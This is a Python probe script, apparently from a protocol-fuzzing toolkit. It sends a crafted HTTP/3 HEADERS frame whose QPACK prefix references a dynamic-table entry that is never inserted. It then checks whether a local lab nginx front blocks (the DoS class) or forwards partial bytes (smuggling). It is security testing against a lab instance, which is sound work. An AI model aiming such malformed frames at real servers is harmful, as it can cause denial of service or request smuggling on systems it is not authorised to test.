"""QPACK reference-before-insert prove-or-kill. Build an H3 HEADERS frame whose QPACK
prefix declares Required Insert Count = 1 (needs a dynamic-table entry) but send no
encoder-stream insert, so the decoder BLOCKS. Fire it at a front that enables the dynamic
table (nginx: cap 4096, blocked_streams 128), and check whether the front forwards
ANYTHING to the origin while blocked (smuggling) or buffers/blocks (the published DoS
behavior). Baseline: the same headers with RIC=0 must forward clean (proves the channel).
Usage: QD_TAP=<tap> python qpack_block_probe.py <port>"""
import asyncio, os, ssl, sys, time
sys.path.insert(0, "/home/j4kuuu/Desktop/tools/Phage/src")
from aioquic.asyncio.client import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h3.connection import H3_ALPN
from aioquic.quic.configuration import QuicConfiguration
from phage.evo.driver import _qpack_int, _uvarint

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4438
TAP = os.environ.get("QD_TAP", "/home/j4kuuu/Desktop/tools/Phage/lab_nginx_h3/logs/tap_ne.jsonl")

REQ = [(b":method", b"POST"), (b":scheme", b"https"), (b":authority", b"lab"),
       (b":path", b"/qpack"), (b"content-length", b"0")]


class P(QuicConnectionProtocol):
    def quic_event_received(self, e):
        pass


def field_section(fields, ric_prefix):
    body = bytearray(ric_prefix)
    for name, value in fields:
        body += _qpack_int(0x20, 3, len(name)) + name  # literal name+value, no dynamic
        body += _qpack_int(0x00, 7, len(value)) + value
    return bytes(body)


def headers_frame(fields, blocked):
    # RIC=0 (b"\x00\x00") forwards normally; RIC=1 (b"\x02\x00") makes the decoder block
    # waiting for an encoder insert that never arrives.
    prefix = b"\x02\x00" if blocked else b"\x00\x00"
    sec = field_section(fields, prefix)
    return _uvarint(0x01) + _uvarint(len(sec)) + sec


async def fire(blocked):
    cfg = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    cfg.verify_mode = ssl.CERT_NONE
    async with connect("127.0.0.1", PORT, configuration=cfg, create_protocol=P) as c:
        await asyncio.wait_for(c.wait_connected(), 5)
        sid = c._quic.get_next_available_stream_id()
        c._quic.send_stream_data(sid, headers_frame(REQ, blocked), end_stream=True)
        c.transmit()
        await asyncio.sleep(1.5)


def probe(label, blocked):
    off = os.path.getsize(TAP) if os.path.exists(TAP) else 0
    try:
        asyncio.new_event_loop().run_until_complete(fire(blocked))
    except Exception as e:
        pass
    time.sleep(0.4)
    fwd = b""
    if os.path.exists(TAP):
        with open(TAP, "rb") as f:
            f.seek(off)
            fwd = f.read()
    rl = fwd.split(b"\r\n", 1)[0][:40]
    print(f"  {label:32} forwarded {len(fwd)}B  reqline={rl!r}")
    return len(fwd)


print(f"### QPACK reference-before-insert on port {PORT} (tap {TAP})")
base = probe("baseline RIC=0 (must forward)", blocked=False)
blk = probe("blocked RIC=1 (no insert)", blocked=True)
print(f"\n=> baseline forwarded={base>0}, blocked forwarded={blk>0}")
print("   " + ("blocked request forwarded nothing: buffers/blocks (DoS class, no smuggling)"
               if blk == 0 else "*** blocked request forwarded bytes: investigate partial-forward ***"))
